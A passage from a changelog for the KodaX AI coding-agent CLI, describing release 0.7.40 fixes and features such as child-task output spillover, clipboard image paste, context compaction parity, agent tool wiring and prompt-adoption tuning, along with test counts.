- **Tool schema slim eval (DEFER both v2 + v3)**. Commit `d68141ea`. Designed + ran the largest two-Scout-tool slim attempt: `ask_user_question` (2760 B / ~690 tok) + `todo_create` (2384 B / ~596 tok) — combined ~785–990 tokens potentially saved. 4-alias panel × 9 cases × 5 runs + panel-internal majority audit (initial 85–97% disagreement on AUQ_6 / 18–30% on TC_1 fixed by switching to v2 `CRITICAL RULE` prompt → 0% disagreement, data validated). Both variants **DEFER**: v2 gate (a) violations AUQ_1 zhipu −20pp + TC_1 zhipu/ds/kimi −20 to −40pp; v3 gate (a) violations AUQ_1 zhipu/ds −20 to −40pp + TC_1 zhipu/ds −40pp. Reason: `"For X use Y, NOT Z"` comparative clauses in schema descriptions are load-bearing disambiguation priors — slimming caused zhipu/ds to mis-classify simple cases. Pattern matches existing `feedback_simplifying_prompt_can_regress` + `feedback_model_structural_floor_not_prompt_tunable`. Future schema-slim work: don't touch "use X for ... NOT for ..." clauses; safe to slim version prefixes + return-value descriptions + "use sparingly" style instructions + property description secondary detail. Net cost ~$23 within ~$27 budget.

### Test coverage delta

- New: 17 (S1) + 20 (S2) + 20 (S3) + 15 (S4) + 15 (S5) + 7 (S6 integration) + 4 (W1) + 14 (W2) + 10 (W3) + 9 (W4) = 131 FEATURE_125 tests; 9 (FEATURE_165) + 7 (FEATURE_166) + 29 (FEATURE_167) + ~30 (FEATURE_170 C1–C6 follow-ups) = ~75 reliability tests; 50 (FEATURE_171 R4 tool wiring contract) + 0 net new for R1–R3 (all R-series ran the full pre-existing 4314 each round); ~95 FEATURE_172 Phase 1 (65 transcript-layout helpers + 8 golden snapshot + 22 hit-test/selection edge) + 17 React.memo comparator + 7 ScreenBuilder + 1 last-write-wins + 1 KODAX_RENDER_TRACE = ~120 FEATURE_172 tests; 4 cache-coalesce regression tests for the TTFB stack (P2 in-flight, P3 cross-call, P3+ multi-round, refresh:true-within-TTL).
- Total green at HEAD: **5,081 tests pass + 23 todo + 1 skipped across 8 workspaces** (agent 477 / coding 2712 / llm 276 / mcp 28 / repl 1419 / repo-intel & skills 136 / repointel-protocol & session-lineage 18 / tracing 15). `tsc -p packages/coding/tsconfig.json --noEmit` + `tsc -p packages/repl/tsconfig.json --noEmit` both clean.

## [0.7.40] - 2026-05-13

### Theme

**Envelope Spillover + Vision Bridge** — Two parallel-developed features close gaps in the child-agent communication path (FEATURE_121) and the REPL input path (FEATURE_134). FEATURE_121 routes child task summaries through the existing `tool-result-policy.ts` spillover system (50KB per-banner + 200KB envelope aggregate cap, mirror of claudecode's `MAX_TOOL_RESULTS_PER_MESSAGE_CHARS`), removing two prior hard truncations (`orchestration.ts:1033` 1600-char slice + `dispatch-child-tasks.ts:256` 200-char slice) that were silently losing 95%+ of child output bytes. A follow-up LLM blob summarizer fallback handles the residual `spillFailed + content > 100KB` data-loss edge that the main slice's inline fallback would otherwise resolve by blowing the Worker context window. FEATURE_134 adds 5 paste sources (bracketed paste / `@<path>` file refs / macOS Cmd+V auto-link / Windows Alt+V explicit / macOS-Linux Ctrl+V backup) on top of the existing `KodaXImageBlock` AI-layer vision serialization, completing the round-trip from screenshot in clipboard to multimodal `user` message at any of the 12 KodaX providers. A late P0 regression in REPL transcript rendering (transcript items invisible during agent execution under AMA mode on Windows ConPTY) was diagnosed as `useDeferredValue` starvation in Ink under Node.js (no DOM idle-scheduling bridge), fixed by removing the deferral indirection — the 200-item UUID-anchored cap from FEATURE_060 Tier 2 retains the perf protection that was the actual fix for SSH-resume O(N) blow-up.

### Added

- **FEATURE_121 — Envelope Spillover Gap-Fix + LLM Blob Summarizer Fallback**. Two-commit landing: main slice (`0a0f844e`) + follow-up LLM blob summarizer (`ba0c82f9` + review fixes `05259ab2`). Removes the `orchestration.ts:1033` 1600-char `truncateText` + `dispatch-child-tasks.ts:256` 200-char `slice` two-layer hard truncation that silently dropped 95%+ of child task output (a 25KB audit report reached the Worker as ~50 tokens). Routes every `<task-completed>` banner through `applyToolResultGuardrail('child_task_summary', ...)` — 50KB head + spill-to-file under `getAgentConfigPath('tool-results')/<id>.txt`, banner now carries a preview + spill path that the Worker reads via standard Read tool. `composeIdleYieldUserMessage` in `@kodax/agent/orchestration/idle-yield.ts` gains a 200_000-chars aggregate envelope cap (mirror of claudecode's `MAX_TOOL_RESULTS_PER_MESSAGE_CHARS=200_000`) — when N banners individually fit but together exceed envelope budget, the enforcer calls `applyToolResultGuardrail(..., { forceSpill: true })` to reclaim space. Capability sections include a `LARGE CHILD OUTPUT (FEATURE_121 v0.7.40)` block teaching the Worker the spillover-path Read pattern. 4-alias × 3-case × 5-runs Layer 2 eval clears PARTIAL SHIP (3/4 aliases ≥80% on each case; mmx/m27 weak floor 60-80% documented in test guide). **Follow-up — LLM Blob Summarizer (last-resort fallback)**: when `persistToolOutput` fails (ENOSPC / EACCES / EROFS / SELinux denial) AND raw content > `LARGE_CONTENT_THRESHOLD_BYTES` (100KB), `dispatch-child-tasks` now calls `ctx.summarizeBlob(content, {maxChars: 8000})` to compress to a ~2-8KB lossy summary preserving file paths / line numbers / error codes / identifiers / findings verbatim, banner-wrapped with `[SPILL FAILED — original ${size} compressed via LLM summarizer; raw content unavailable. Worker: treat this summary as LOSSY...]`. The summarizer callback is injected into `KodaXToolExecutionContext` via lazy-once memoization in `runner-driven.ts` bound to the Worker's own provider/model — layer-independent (`@kodax/agent` stays unaware of LLM client). If the summarizer itself fails (provider error / abort), falls back to inline full content with an emergency banner `[SPILL FAILED AND LLM SUMMARIZER FAILED — original ${size} inlined as last-resort emergency dump...]` so the Worker never silently receives oversized opaque content. Honors the FEATURE_121 contract: **silent data loss is the worst outcome; over-budget but observable is acceptable**. 4-alias × 2-case × 3-runs Layer 2 eval clears SHIP gate (4/4 aliases × 100% retention on audit_report + grep_findings cases). Test guide: `docs/test-guides/FEATURE_121_v0.7.40_TEST_GUIDE.md`. Design doc: `docs/features/v0.7.40.md#feature_121-envelope-spillover-gap-fix--child-task-summary-接入-tool-result-policy`.
- **FEATURE_159 — MessageQueue as Single Source of Truth + Idle-Yield Mode-Split**. Main commit `948b8879` (Phase 3 mode-split synthetic + unified queued-followup predicate) + design `daa8e846` + follow-up `9d4c6ae4` (queue filter scope + verdict.summary echo) + test-isolation `29369a2a` (MessageQueue test isolation + compaction flake fix). User-reported during v0.7.40 RC: after Worker dispatched 3 child tasks and the main agent was still tool-calling, user typed a follow-up "你是派出了子Agent再做嘛？" — status bar showed `Queue 1` / `Queued follow-ups: 1`, but the prompt looked **swallowed** when the agent finished its investigation (not folded into the answer). Forensic showed two stacked failures: (1) `waitForWakeEvent` consumed messages via `MessageQueue.dequeue()` with no reverse notification to REPL, so the React `state.pendingInputs` retained stale entries and the `Queue N` indicator never cleared; (2) drained prompts were marked `_synthetic: true` and hidden from transcript — the user prompt appeared dropped even though it had landed in the model context. Fix flips the substrate: `MessageQueue` becomes the **single source of truth** with typed event subscribe + frozen snapshot read + `mode`/`id`/`predicate` filtering APIs; REPL reverses its sync direction (queue→React mirror via `subscribe`); `composeIdleYieldUserMessage` branches on `msg.mode` — real user prompts emit as **non-synthetic** user-bubble messages (visible in transcript), task-notifications stay synthetic (silent background framing). Net result: claudecode-parity messageQueueManager semantics + SDK-grade observable substrate, without importing claudecode's `commandLifecycle` module, `recordQueueOperation` file sink, or 3-tier priority (kept KodaX's binary user/background). Net −70 LoC, zero new modules. Test guide: `docs/test-guides/FEATURE_159_v0.7.40_TEST_GUIDE.md`. Design doc: `docs/features/v0.7.40.md#feature_159-messagequeue-as-single-source-of-truth--idle-yield-mode-split`.
- **FEATURE_134 — Image / Screenshot Paste Input (REPL Vision Bridge)**. Commit `2e9674bb`. Adds the REPL paste entry point on top of KodaX's existing `KodaXImageBlock` AI-layer vision serialization (already implemented in `packages/ai/src/providers/anthropic.ts:770` + `openai.ts:904` + `image-serialization.ts`). 5 paste sources per claudecode `usePasteHandler.ts` parity: (1) bracketed paste base infra (DEC 2004 `ESC[200~/201~` wrapping — note FEATURE_134's redundant `enableBracketedPasteMode()` pre-render write was removed in `ca009b3a` since `KeypressContext.tsx:134` already owns DEC 2004 lifecycle via Ink's managed stdout); (2) file path paste — `extractImagePaths` splits on `/` or `[A-Za-z]:\\` + extension; (3) macOS Cmd+V auto-link via `osascript NSPasteboard` read; (4) Windows Alt+V explicit keybind (Ctrl+V is system-paste-reserved on Windows, same as claudecode); (5) macOS/Linux Ctrl+V backup via `wl-paste` / `xclip` / `osascript`. Building blocks in `packages/repl/src/paste/`: `bracketed-paste-mode.ts` (DEC 2004 lifecycle), `image-normalize.ts` (jimp decode + clamp 2000px + PNG→JPEG quality ladder 80/60/40 to fit 3.75MB), `clipboard-image.ts` (cross-platform reader, never throws), `persist-image.ts` (writes to `$TMPDIR/kodax-paste/` + returns path-based `KodaXImageBlock`), `paste-handler.ts` (5-source orchestrator). Library choice: jimp (~10MB pure JS) over sharp (~30MB native binary) — jimp install never fails on cross-platform CI; claudecode picked sharp for broader use cases but KodaX only paste-uses, so jimp is the simpler fit. Integration: paste event → `@<resolved-path>` text-token translation via existing `common/input-artifacts.ts:preparePromptInputArtifacts` pipeline which already converts `@<path>` refs to `KodaXInputArtifact[]` on submit — no changes needed downstream. Test guide: `docs/test-guides/FEATURE_134_v0.7.40_TEST_GUIDE.md`. Design doc: `docs/features/v0.7.40.md#feature_134-image--screenshot-paste-input--repl-vision-bridge`.

### Fixed

- **REPL transcript rendering starvation — `useDeferredValue` removed from `displayHistory` chain**. Commit `ca009b3a`. User-reported P0 (AMA mode, Windows ConPTY): pressing Enter on a query showed nothing in the transcript for the entire agent run — header banner + TodoListSurface + spinner + status bar rendered normally, but assistant thinking blocks / tool calls / tool results / assistant text remained invisible until task completion forced a re-render. Root cause: `useDeferredValue(displayHistory)` (introduced in v0.7.30 FEATURE_060 Tier 2 as a polish on top of the 200-item cap that was the real perf fix) marks transcript rebuild as low-priority React work. Under React DOM, this work flushes during browser idle time via the scheduler's idle-callback bridge. Ink uses react-reconciler without that bridge — under Node.js, high-priority work (spinner ticks @30fps, streaming setState bursts, tool-state updates) perpetually pre-empts the deferred work, so the low-priority track never flushes until a "big" state change like `setIsLoading(false)` forces a sync re-render. v0.7.40 surfaced the latent starvation: FEATURE_121's envelope spillover replaced `slice(0, 200)` child task truncation with up-to-50KB head + spill content, raising per-item `buildPromptSurfaceItems` cost from ~0.1ms (200 chars) to ~10-50ms (50KB) — single-item cost crossed the React scheduler's low-priority deferral threshold, starving the deferred update perpetually under high-frequency setState bursts. Fix: replace `useDeferredValue(displayHistory)` with direct passthrough. The 200-item UUID-anchored cap (the real perf protection from FEATURE_060 Tier 2) and the transcript-mode 30-message cap remain — together with React's built-in `useMemo` memoization (which prevents spinner ticks from triggering `buildPromptSurfaceItems` when history is unchanged), per-render cost stays bounded at O(min(N, 200)). Trade-off: long-session `kodax -c` resume on Windows-SSH may add ~10-40ms one-time first-paint cost — well below human perception threshold (~100ms). Length-thresholded fallback pattern documented inline (`displayHistory.length > 100 ? lazyDeferred : displayHistory`) for future repro.
- **FEATURE_121 v0.7.40 follow-up build break + memoize + emergency banner**. Commit `05259ab2`. Fixes three review-uncovered issues from `ba0c82f9`: (1) **CRITICAL build break** — `blob-summarizer.ts` imported `KodaXProvider` (not exported from `@kodax-ai/llm`); replaced with `KodaXBaseProvider` everywhere. `tsc --noEmit` missed this; `tsc -b` with declaration emission caught it during `npm run build:packages`. (2) **HIGH memoize** — `runner-driven.ts` `summarizeBlob` was rebuilding the factory closure (including `resolveProvider`) on every call; changed to lazy-once memoize (cached on first invocation, reused for the rest of the Worker run). (3) **MEDIUM emergency banner** — when LLM summarizer ITSELF fails AND we fall back to inline 100KB+ content, the Worker received the raw blob with no banner; now prepends `[SPILL FAILED AND LLM SUMMARIZER FAILED — original ${size} inlined as last-resort emergency dump]` so the Worker sees a clear signal to expect possible downstream truncation and re-run upstream with narrower scope.
- **`fix(build,v0.7.39): make 'npm run build' produce shippable dist/`** (commit `b77fa0a3`). Footgun caught during clean-room publish dry-run: `npm run build` previously ran `npm run build:packages && tsc` — the trailing bare `tsc` read root `tsconfig.json` (`outDir: ./dist`, `declaration: true`) and overwrote the esbuild bundle with unbundled `tsc` output containing bare `import '@kodax-ai/coding'` specifiers, which would have shipped a broken tarball — consumers running `npm install @kodax-ai/kodax` would hit `ERR_MODULE_NOT_FOUND`. Fix: `"build": "npm run build:packages && npm run build:bundle && tsc --emitDeclarationOnly"`. The `--emitDeclarationOnly` flag is the critical guard — tsc skips `.js` entirely and only writes `.d.ts` on top of the esbuild bundle. Now any caller (developer, CI, `release.mjs`) can run `npm run build` at any time and get a complete, shippable dist/. Side benefit: SDK consumers get real TypeScript types for all 5 subpath entries (was untyped before).
- **`fix(release,v0.7.40): bake KODAX_VERSION into bundle via esbuild --define`** (commit `b70048b7`). The previous v0.7.39 release bundled with `process.env.KODAX_VERSION` left unresolved, so the runtime version was `undefined` in the published `dist/kodax_cli.js` — visible to users as `KodaX undefined` in the banner. Fix: `scripts/build-bundle.mjs` reads root `package.json` at build time and injects via esbuild `--define`, so the bundled CLI carries the correct version literal. `release.mjs` flow unchanged: bumps `package.json` first, then `npm run build` (which reads the bumped version).
- **FEATURE_134 follow-up: Alt+V duplicate-image-file accumulation in temp dir**. User-reported regression during v0.7.40 RC validation: pressing Alt+V on the same screenshot created many identical-content files with different UUID names under `$TMPDIR/kodax-paste/`. Two root causes: (1) `prompt-input-controller.ts:triggerExplicitImagePaste` had no single-flight guard — OS-level key autorepeat (Windows ConPTY in particular) fires multiple Alt+V keypresses on a brief hold, each spawning a concurrent `readClipboardImage` + `persistImageAsBlock` pair; (2) `persist-image.ts` used `randomUUID()` filenames so even identical buffer content wrote N distinct files. Fix in [packages/repl/src/paste/persist-image.ts](packages/repl/src/paste/persist-image.ts): filename derived from `sha256(buffer).slice(0,16)` — identical content reuses one path, `writeFile` is idempotent on rewrite. Fix in [packages/repl/src/ui/utils/prompt-input-controller.ts](packages/repl/src/ui/utils/prompt-input-controller.ts): `explicitImagePasteInflightRef` boolean ref guard drops re-entrant invocations until the in-flight clipboard read settles. New tests: `persist-image.test.ts` adds "reuses the same path for identical content" + "produces distinct paths for different content"; `prompt-input-controller.test.ts` adds "Alt+V autorepeat fires the clipboard read only once (single-flight guard)". Together the two fixes cap temp-dir growth per unique screenshot at one file per session.
- **FEATURE_134 follow-up: Gemini-CLI vision via `@<path>` token injection** (commit `71d45783`). The ACP base class (`packages/ai/src/providers/acp-base.ts`) was silently dropping image blocks at the prompt flatten step (`.filter(b => b.type === 'text')`) before forwarding to the CLI bridge. New extension point `serializeImageBlockToPromptToken(block)` on `KodaXAcpProvider` defaults to `null` (preserves silent-drop for Codex-CLI which has no `codex exec --json` image surface), and `KodaXGeminiCliProvider` overrides to return `@<absolutePath>` — Gemini CLI 2.x's file-include syntax inlines any readable file (including images) into the model context. The CLI-bridge capability profile gets a new sibling `IMAGE_INPUT_CLI_BRIDGE_PROVIDER_CAPABILITY_PROFILE` so the policy gate sees the right metadata. 2 new tests in `cli-bridge-providers.test.ts` pin the exact wire format for both Gemini (`@<path>`) and Codex (null).
- **FEATURE_134 follow-up: paste tmp dir age-based GC at REPL bootstrap** (commit `0eb6cbb4`). Per-session content-hash dedup (commit `12589a46`) prevented Alt+V autorepeat from stacking duplicates within one session, but cross-session accumulation was still unbounded — files only cleared on OS tmpdir reboot. New `prunePasteTmpDir(now?)` exported from `packages/repl/src/paste/persist-image.ts` deletes `paste-*` files older than `PASTE_TMP_TTL_MS` (24h). Non-paste files in the same dir survive (e.g. user-dropped `notes.txt`); per-file errors swallowed so concurrent KodaX instance races don't break REPL startup. Wired in `InkREPL.tsx` bootstrap as a fire-and-forget dynamic import — never blocks first paint. Active-session paste files (always within TTL) are preserved across overnight idle. 4 new tests cover dir-not-exist / age-based deletion / non-paste preservation / TTL boundary.
- **FEATURE_134 follow-up: custom provider vision opt-in documented** (commit `db36dc69`). README.md + README_CN.md gain a complete `customProviders` example showing the `capabilityProfile.multimodalSupport: 'image-input'` nested shape. Built-in 12 providers ship with the flag already enabled; only custom providers needed opt-in instructions because the field was implicitly available via `KodaXCustomProviderConfig.capabilityProfile` but undocumented.
- **AMA in-turn compaction parity gap — three-phase lifecycle restored (microcompact + snapshot-aware trigger + graceful fallback)**. User-reported during v0.7.40 RC validation: status bar climbed from 124k → 138k → 150k across three AMA rounds with zhipu-coding/glm-5.1, no compaction / microcompaction / graceful prune ever firing despite crossing the 60% × 200k = 120k threshold. Latent since FEATURE_114 v0.7.36 (4→2 role consolidation) but masked by FEATURE_076's over-aggressive round-exit reshape collapsing context to ~1k after every round; once the v0.7.40 reshape fix above let context grow naturally, the gap surfaced. Three structural deltas vs SA path's `runCompactionLifecycle` ([compaction-orchestration.ts:358](packages/coding/src/agent-runtime/middleware/compaction-orchestration.ts#L358)): (1) **trigger metric mismatch** — the AMA `compactionHook` ([_internal/managed-task/compaction.ts](packages/coding/src/task-engine/_internal/managed-task/compaction.ts)) compared `estimateTokens(transcript)` to the threshold, but transcript-only estimate excludes the system prompt + tools schema (Worker role prompt + AGENTS.md + REPO INTELLIGENCE TOOLS teaching + repo-intel capsule + 12 tool definitions ≈ 20–35k tokens after FEATURE_114 worker consolidation + FEATURE_161 prompt growth). 200k-window 60% trigger needs API total > 120k, but the hook saw ~95–115k transcript and never fired — the status bar's 138k was the real total (system + tools + transcript) sourced from `streamResult.usage.totalTokens`. (2) **no microcompact phase** — SA path runs `microcompact(messages, DEFAULT_MICROCOMPACTION_CONFIG)` every turn at zero LLM cost ([run-substrate.ts:603](packages/coding/src/agent-runtime/run-substrate.ts#L603)) to prune old tool_results / image blocks past `maxAge=20` turns; AMA hook bypassed it entirely. (3) **no graceful degradation fallback** — SA path's third phase `applyGracefulDegradationGate` ([compaction-orchestration.ts:250](packages/coding/src/agent-runtime/middleware/compaction-orchestration.ts#L250)) deterministically prunes tool_results when LLM compact threw / returned `compacted: false` / left context still above `triggerTokens × pruningGapRatio`; AMA hook bailed silently on LLM failure, letting context grow unbounded. Fix in [packages/coding/src/task-engine/_internal/managed-task/compaction.ts](packages/coding/src/task-engine/_internal/managed-task/compaction.ts): hook now mirrors SA path's three-phase lifecycle — (Phase 1) `microcompact` every call (free, prunes old tool blocks); (Phase 2) `intelligentCompact` LLM summary with snapshot-aware trigger check `resolveContextTokenCount(transcript, snapshot)` instead of raw `estimateTokens` — `snapshot.currentTokens` carries the LAST LLM call's API-reported `usage.totalTokens` (system + tools + transcript) so the threshold check uses the same metric the status bar displays; the snapshot is refreshed by the LLM adapter ([runner-driven.ts](packages/coding/src/task-engine/runner-driven.ts) `buildRunnerLlmAdapter`) after every stream completion via the new `contextTokenSnapshotRef` shared between adapter (writer) and hook (reader); (Phase 3) `gracefulCompactDegradation` deterministic prune fallback when LLM compact failed / partial / circuit-breaker-tripped — the gate's "still over" check also uses snapshot-aware accounting for symmetry with Phase 2. Snapshot rebases to `createEstimatedContextTokenSnapshot(compacted)` after any compaction (LLM or graceful) so subsequent delta corrections start from the compacted baseline rather than the stale pre-compaction API total. New test file [packages/coding/src/task-engine/_internal/managed-task/compaction.test.ts](packages/coding/src/task-engine/_internal/managed-task/compaction.test.ts) pins all three phases with 9 tests covering: microcompact-only return path (below trigger); microcompact identity (no diff returns undefined); snapshot-aware trigger fires when transcript-only estimate is sub-threshold but API-total crosses; no-snapshot cold-start falls back to transcript estimate (unchanged baseline); graceful fallback on LLM throw / `compacted: false` / partial success above gap-ratio; snapshot rebase after successful LLM compaction; circuit-breaker semantics (3 strikes skip LLM but graceful still fires). Side fix in [packages/coding/vitest.config.ts](packages/coding/vitest.config.ts) + [packages/repl/vitest.config.ts](packages/repl/vitest.config.ts): `@kodax-ai/llm` alias updated from stale `packages/ai/` to `packages/llm/` (rename leftover from v0.7.40 directory rename above). **Behaviour delta vs pre-fix**: AMA mode compaction now triggers at the same effective API-total threshold as SA mode; graceful fallback prevents zhipu/kimi/mimo provider-side LLM summary failures from leading to monotonic context growth; microcompact's per-turn pruning recovers ~5–15% of context per long-running Worker turn even without crossing the LLM trigger threshold. Full coding suite green: **2446 tests pass** (239 test files, 23 todo; +9 new compaction hook tests).
- **FEATURE_076 follow-up: round-boundary reshape now preserves tool_use / tool_result chains across rounds (cache + re-read regression fix)**. User-reported during v0.7.40 release validation: status bar dropped from `121k/200k` to `1.1k/200k` after an AMA round, and follow-up rounds were re-reading files the prior worker had already read. Root cause: FEATURE_076 (v0.7.25)'s `reshapeToUserConversation` replaced `result.messages` wholesale with a synthetic `[user, assistant]` dialog at every round exit, discarding the entire `tool_use` / `tool_result` chain. The replacement was the correct fix for v0.7.25's actual problem (cross-round role-prompt pollution — Evaluator role prompts leaking into the next round's worker context as user messages) but over-corrected by stripping structurally useful content, with two concrete production costs: (1) **cross-round file re-reads** — round 2 worker had no visible `tool_result` for files round 1 already read, so common follow-ups like "now modify that file you reviewed" forced re-reads; (2) **provider prompt-cache miss on the dialog prefix** — round 1's first LLM call prefix was `[system, user, assistant(tool_use), user(tool_result), …]`, round 2's is `[system, user, assistant(final), user_2, …]`; the prefixes diverge immediately after the first user message, so the dialog portion gets zero cache reuse across rounds. Fix in [packages/coding/src/task-engine/_internal/round-boundary.ts](packages/coding/src/task-engine/_internal/round-boundary.ts): new `preserveTranscriptForRoundExit` helper runs a 4-step pipeline — (Step 1) strip the leading stale role-prompt system message (Runner.run leaves the last-active agent's role prompt at `transcript[0]`; round 2's entry agent injects its own at position 0, so keeping the previous one would create two conflicting `system` instructions back-to-back); CompactionSummary system messages are preserved via the now-exported `COMPACTION_SUMMARY_PREFIX` discriminator from `@kodax-ai/session-lineage`. (Step 2) Apply `normalizeLoadedSessionMessages` to strip V1-legacy role-prompt-wrapped trailing `{user, assistant}` pairs (`"You are the Evaluator role..."` phrased as a user message); no-op for V2 AMA where role prompts are system-message-shaped. (Step 3) Ensure the round's user prompt is observable — V2 sessions retain it via `runnerInput`, V1 paths may have lost it when normalisation stripped the wrapper. (Step 4) Ensure the transcript ends with a plain-text assistant carrying the sanitised final answer; **replaces** (not appends) when the last message is an assistant with array content (typically `emit_verdict` / `emit_handoff` tool_use blocks — KodaX protocol machinery whose user-facing payload is captured in `result.lastText`). The replace avoids two consecutive `role: 'assistant'` messages which Anthropic's API rejects on the next request. Net behaviour: round 2 worker sees what round 1 read/edited, prompt-cache prefix stays continuous, status bar reflects the actual context size (e.g. ~50k instead of 1.1k after a heavy worker round) — a side-effect users will perceive as the bar "no longer collapsing after each turn". Updated [packages/coding/src/task-engine/_internal/round-boundary.test.ts](packages/coding/src/task-engine/_internal/round-boundary.test.ts) with 7 new cases covering: V2 worker-shape preservation, terminal `emit_verdict` tool_use replacement (no consecutive-assistant violation), `CompactionSummary` system message preservation, dedup of already-correct trailing assistant, empty `result.messages`, compaction-system-only transcript, terminal `thinking`-only assistant. `COMPACTION_SUMMARY_PREFIX` exported from [packages/session-lineage/src/compaction/compaction.ts](packages/session-lineage/src/compaction/compaction.ts) so the producer-consumer pair no longer maintains the literal in two places. Test guide: regression case lives in [docs/test-guides/FEATURE_134_v0.7.40_TEST_GUIDE.md](docs/test-guides/FEATURE_134_v0.7.40_TEST_GUIDE.md) once that doc's "round-boundary cache + re-read" section is appended. **Behaviour delta vs FEATURE_076 baseline**: the v0.7.25 cross-round-coherence guarantee is preserved (stale role prompts still get stripped); only the over-corrective full-transcript replacement is reverted. Full test suite green at HEAD: **5745 tests pass** (was 5742; +3 new edge-case tests).
- **FEATURE_168 — AMA agent tool wiring (exclude-based, registry as source of truth)**. Commit `56330d1c` + doc `e902b194`. Root cause investigation surfaced from production trace 2026-05-15 (zhipu/glm51 Worker blocked at `emit_handoff` pending-children gate, told by the gate's own error message to call `task_stop`, model honestly responded that `task_stop` "is not registered as a callable tool" — and the model was correct). `runner-driven.ts::buildRunnerAgentChain` had used **include-mode hand-written `agent.tools` arrays** for all 5 AMA roles (Scout / Planner / Generator / Evaluator / Worker) since v0.7.26, while the SA path defaults to `listToolDefinitions()` minus `excludeTools`. The two paths drifted across three features: **FEATURE_120 v0.7.39** registered `send_message` + `task_stop`, taught them in the Worker prompt, gated `emit_handoff` with a "call `task_stop` first" error message — but never wired the `RunnableTool` instances into any AMA agent's tools array. **FEATURE_161 v0.7.40 prompt teaching** taught the Worker 8 repo-intel pull tools (`module_context` / `symbol_context` / `process_context` / `impact_estimate` + 4 shallow ones), `worker-role-prompt.ts:127` comment claimed "the 8 pull tools get stripped from the LLM-visible tool list (see agent-runtime/tool-resolution.ts)", but AMA path doesn't go through `tool-resolution.ts` — it reads `agent.tools` directly, so only 4 of the 8 ever landed in the schema. **Web tools / ask_user_question / worktree_create / worktree_remove / insert_after_anchor / undo**: registered + `permission` system gave them entries, but no AMA agent could see them. Total **17 registered tools silently dropped** from production AMA; no test layer caught it because no test asserted "agent.tools actually contains a schema entry with this name". Fix: switch AMA path to exclude-based wiring matching SA semantics. New `buildAgentToolsFromRegistry(role, ctx, budget, events, overrides)` helper enumerates `listToolDefinitions()` and applies `AMA_BASELINE_EXCLUDE ∪ <ROLE>_EXTRA_EXCLUDE`. Role-specific wraps (mutation-guarded bash/write/edit/multi_edit for Generator/Worker, read-only bash for Evaluator, `dispatch_child_task` per-role drain wrappers, FEATURE_097 throttle-aware `todo_update`) flow through the `overrides` map. Evaluator security boundary made **architectural, not prompt-dependent**: write/edit/multi_edit/insert_after_anchor/undo/dispatch_child_task/send_message/task_stop/worktree_create/worktree_remove/exit_plan_mode/todo_update/ask_user_question all hard-excluded from `EVALUATOR_EXTRA_EXCLUDE` — a prompt-jailbroken or tool-confused Evaluator is physically unable to mutate, dispatch, or change plan state. Planner kept as read-only inspection role (no bash, no mutation, no dispatch, no user interaction). Scout/Worker carry the full execution surface. Generator unchanged behaviorally; new tools (web/repo-intel/coordinator) added to schema. New contract test [packages/coding/src/task-engine/runner-driven-tool-wiring.test.ts](packages/coding/src/task-engine/runner-driven-tool-wiring.test.ts) pins each role's full tool-name set against `getAmaRoleExpectedToolNames(role)` derivation plus spot-checks for FEATURE_120 / FEATURE_161 coverage / Evaluator boundary / Planner boundary / no-orphan invariant — 50 assertions total. Any future EXCLUDE-set change or registry addition surfaces as a concrete test failure, not a silent production schema gap. **Test impact**: 2507/2507 coding-package tests pass (240 files, +50 new contract assertions). No regression in `runner-driven.test.ts` (130 tests including FEATURE_165 race-regression), `child-executor.test.ts` (30), `task-stop` / `send-message` handler tests (28), `worker-role-prompt.test.ts`. Design doc: [docs/features/v0.7.40.md#feature_168--ama-agent-tool-wiringexclude-based-registry-as-source-of-truth](docs/features/v0.7.40.md#feature_168--ama-agent-tool-wiringexclude-based-registry-as-source-of-truth).
- **FEATURE_169 — Pull-Tool Prompt Adoption Hardening** (commit `519af4b9`). Production trace after FEATURE_161 wiring + FEATURE_168 schema fix surfaced 3 residual adoption gaps the wiring alone did not close: (1) **Worker hand-feeding bash in `dispatch_child_task.objective`** — 18% of production dispatch (3/17 in 2026-05-15 audit) embedded literal `git diff v0.7.39..HEAD`-style command directives, overriding the child's prompt-side tool teaching; 0/17 objectives recommended a pull-tool family. (2) **Child agent prompt stayed read+grep-first** — `CHILD_AGENT_SYSTEM_PROMPT` had taught "3-8 parallel tool calls (glob + grep + key file reads)" since v0.7.18 with no mention of pull-tools; children defaulted to grep/read in review and exploration tasks. (3) **Worker self-review still picked `bash git diff` first** — F7 taught tool existence but not "for review tasks, use which one". Three localized prompt strengthenings (F0a / F0b / F1v2 / F3) ship; F2 (3-tier order injection) **rejected** post-eval as zero-value churn. F0a teaches Worker to keep dispatch objective as data ("scope: v0.7.39..HEAD") not command ("使用 `git diff v0.7.39..HEAD`"); F0b adds an explicit pull-tool-family recommendation to the dispatch objective teaching; F1v2 adds child-agent reverse-steering toward pull-tools when the task is review/exploration-shaped; F3 reframes the Worker change-review surface from `bash git diff` first to `module_context` / `symbol_context` first. No wiring change, no new tool, no new permission. Prompt eval (`tests/feature-169-pull-tool-adoption.eval.ts`) clears SHIP gate (4/4 aliases, F0a/F0b/F1v2/F3 each ≥80% on 3 cases). Design doc: `docs/features/v0.7.40.md#feature_169--pull-tool-prompt-adoption-hardening-worker-dispatch-objective--child-reverse-steering--change-review-reframe`.
- **FEATURE_134 follow-up: vision capability flag widened to 9 additional providers**. User empirically validated 2026-05-13 that `kimi-code` accepts and processes image input despite its v0.7.40 RC snapshot flag claiming `multimodalSupport: 'none'`. Root cause: AMA path (`runner-driven.ts` `provider.stream` direct call) bypasses the SA-path `applyProviderPolicyGate` (`run-substrate.ts:660`) where multimodal block enforcement lives, so the latent flag mismatch was never observable in production. The pre-v0.7.40 RC flag was over-conservative: every Anthropic-compat clone inherits the image-block forwarding serializer at `anthropic.ts:770`, and every OpenAI-compat clone inherits the `image_url` forwarding serializer at `openai.ts:904`. Flag widened in `packages/ai/src/providers/registry.ts` from `NATIVE_PROVIDER_CAPABILITY_PROFILE` to `IMAGE_INPUT_NATIVE_PROVIDER_CAPABILITY_PROFILE` for: **Anthropic-compat clones** — `kimi-code`, `zhipu-coding`, `mimo-coding`, `ark-coding`, `minimax-coding`; **OpenAI-compat clones** — `deepseek`, `kimi`, `qwen`, `zhipu`. Plus a separate follow-up commit (`71d45783`) wires **Gemini-CLI** vision via the new `serializeImageBlockToPromptToken` extension point on `KodaXAcpProvider` (Gemini CLI 2.x `@<path>` file-include syntax), bringing the final post-release total to **12 vision-capable providers (was 2)** — only `codex-cli` remains text-only because `codex exec --json --full-auto` has no image-input surface today. Production semantics: the flag controls only KodaX's SA-path artificial block; the actual model-level vision contract remains the upstream provider's responsibility — if a specific model alias is text-only, users now see the real API error from the provider instead of a KodaX-side `[Provider Policy] multimodal requests are unsupported` rejection. 